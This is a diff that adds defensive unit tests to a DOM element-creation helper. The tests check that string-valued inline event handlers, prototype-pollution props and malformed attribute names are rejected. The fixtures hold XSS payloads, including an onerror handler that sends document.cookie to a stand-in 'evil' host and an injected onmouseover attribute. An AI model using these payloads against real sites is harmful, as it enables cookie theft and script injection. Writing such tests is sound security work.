@@ -276,3 +276,47 @@ describe('h - refs', () =>
         expect(el.hasAttribute('ref')).toBe(false);
     });
 });
+
+describe('h - hostile props are rejected, not rendered', () =>
+{
+    it('throws on a string-valued on* prop instead of writing a live inline handler', () =>
+    {
+        // A string here would land via setAttribute as onerror="fetch(...)" - a LIVE handler
+        // the browser executes. happy-dom does not run inline handlers, so we assert the
+        // attribute is never written (the throw) rather than execution.
+        expect(() => h('img', { src: 'x', onerror: 'fetch(\'https://evil/?c=\'+document.cookie)' }))
+            .toThrow(/on\* prop must be a function/);
+    });
+
+    it('accepts a function on* handler (the legitimate form)', () =>
+    {
+        const el = h('button', { onClick: () => undefined });
+        expect(el).toBeInstanceOf(HTMLElement);
+        expect(el.hasAttribute('onClick')).toBe(false);
+    });
+
+    it('ignores an inherited enumerable prop (prototype-pollution gadget)', () =>
+    {
+        (Object.prototype as unknown as Record<string, unknown>).onclick = 'alert(1)';
+        try
+        {
+            // for...in would walk the inherited key and write it onto every element; the
+            // own-property guard skips it, so no onclick attribute is ever produced.
+            const el = h('div', {});
+            expect(el.hasAttribute('onclick')).toBe(false);
+        }
+        finally
+        {
+            delete (Object.prototype as unknown as Record<string, unknown>).onclick;
+        }
+    });
+
+    it('throws on an attribute name the DOM cannot set instead of aborting the render', () =>
+    {
+        // A key carrying a space/quote makes setAttribute throw InvalidCharacterError mid-loop,
+        // which would discard the element and its siblings. Reject it with the framework error,
+        // matching the SSR path, so the failure is the same on both sides.
+        expect(() => h('div', { 'x" onmouseover="alert(1)': 'v' }))
+            .toThrow(/invalid attribute name/);
+    });
+});
